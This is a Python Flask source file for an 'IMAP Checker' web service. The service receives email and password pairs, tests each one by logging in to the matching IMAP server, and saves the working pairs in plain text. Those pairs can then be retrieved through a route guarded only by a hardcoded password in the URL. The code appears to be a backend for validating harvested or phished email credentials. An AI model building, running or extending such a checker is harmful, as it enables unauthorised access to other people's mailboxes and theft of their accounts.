import imapclient,imaplib

from flask import Flask , request
import json
from time import *
import sqlite3
from sqlite3 import Error

app = Flask(__name__)

PASSWORD="5tr0ng_P@ssW0rD"

database = "firebase.db"

def create_connection(db_file):
	conn = None
	try:
		conn = sqlite3.connect(db_file)
	except Error as e:
		print(e)
	return conn

def fetch_by_hostname(conn,hostname):
	cur = conn.cursor()
	cur.execute("SELECT imap,port FROM servers WHERE hostname = ?", (hostname,))
	data=cur.fetchall()
	if len(data)>0:
		return (data[0][0],data[0][1])
	else:
		return (None,None)

@app.route('/')
def index():
	return """<html>
	<head><title>IMAP Checker By X</title></head>
	<style>
        html, body {
            height: 100%;
            margin: 0;
            padding: 0;
            width: 100%;
        }
        body {
            display: table;
        }
        .centered-text {
            text-align: center;
            display: table-cell;
            vertical-align: middle;
        }
        </style>
	<body style="background:#000000">
  <div class="centered-text"><h1><font color="#00ff00"><u>This is a simple IMAP Checker By SpeedX</u></font></h1></div></body></html>"""

@app.route('/fetch/'+PASSWORD)
def fetch():
	f=open('success.txt').read().split('\n')
	f="<br>".join(f)
	return """<html>
	<head><title>IMAP Checker By X</title></head>
	<body><h1><marquee>Valid Mails List</marquee></h1><p>"""+f+"""</p></body></html>"""
	return 

@app.route('/clear/'+PASSWORD)
def clear():
	f=open('success.txt','w')
	f.write('')
	f.close()
	
	return """<html>
	<head><title>IMAP Checker By X</title></head>
	<style>
        html, body {
            height: 100%;
            margin: 0;
            padding: 0;
            width: 100%;
        }
        body {
            display: table;
        }
        .centered-text {
            text-align: center;
            display: table-cell;
            vertical-align: middle;
        }
        </style>
	<body style="background:#000000">
  <div class="centered-text"><h1><font color="#00ff00"><u>Saved Mail List Data Was Cleared !!!</u></font></h1></div></body></html>"""

@app.route('/check', methods=['POST'])
def create():
	data=request.get_json()
	print(data)
	mail=data['email']
	passw=data['password']
	server,port=search_server(mail.split('@')[1])
	if server and port:
		if imapCheck(mail,passw,server,port):
			f=open("success.txt",'a')
			f.write(mail+":"+passw+"\n")
			f.close()
			d={"code":200,"message":"Success"}
			return json.dumps(d)
		else:
			d={"code":403,"message":"Failed"}
			return json.dumps(d)
	else:
		d={"code":401,"message":"Bad Request"}
		return json.dumps(d)

@app.errorhandler(404) 
def not_found(e): 
	return """
	
<html> 
<head> 
<title>Page Not Found</title> 
<script language="JavaScript" type="text/javascript"> 
  
var seconds =6; 
// countdown timer. took 6 because page takes approx 1 sec to load 
  
var url="/"; 
// variable for index.html url 
  
function redirect(){ 
 if (seconds <=0){ 
  
 // redirect to new url after counter  down. 
  window.location = url; 
 } else { 
  seconds--; 
  document.getElementById("pageInfo").innerHTML="Redirecting to Home Page after <font color='#ff0000'><u>" 
+seconds+"</u></font> seconds." 
  setTimeout("redirect()", 1000) 
 } 
} 
</script> 
</head> 
  
	<style>
        html, body {
            height: 100%;
            margin: 0;
            padding: 0;
            width: 100%;
        }
        body {
            display: table;
        }
        .centered-text {
            text-align: center;
            display: table-cell;
            vertical-align: middle;
        }
        </style>
	<body style="background:#000000" onload="redirect()">

  <div class="centered-text">
  <font color="#00ff00">
  <h4><p id="pageInfo"></p><h4>
  <h1>Oops! Looks like you came the wrong way !!!</h1><br>
  <h3>
  <a href="/">Click Here</a> To go to the Home Page
  </h3>
  </font></div>
</html> 

"""	
  
def imapCheck(email, password, imapServerName, port):	
	try:
		print('Trying %s' % password)
		M = imaplib.IMAP4_SSL(imapServerName,int(port))
		M.login(email, password)
		# ssl= (port == 993)
		# server = imapclient.IMAPClient(imapServerName,port=port, ssl=ssl)
		# server.login(email, password)
		print('Success! %s' % password)
		return True
	except Exception as exception:
		print(exception)
		return False

def search_server(domain):
	domain=domain.lower()
	if domain=="":
		return (None,None)
	conn=create_connection(database)
	resp=fetch_by_hostname(conn,domain)
	return resp

if __name__=='__main__':
	app.run()

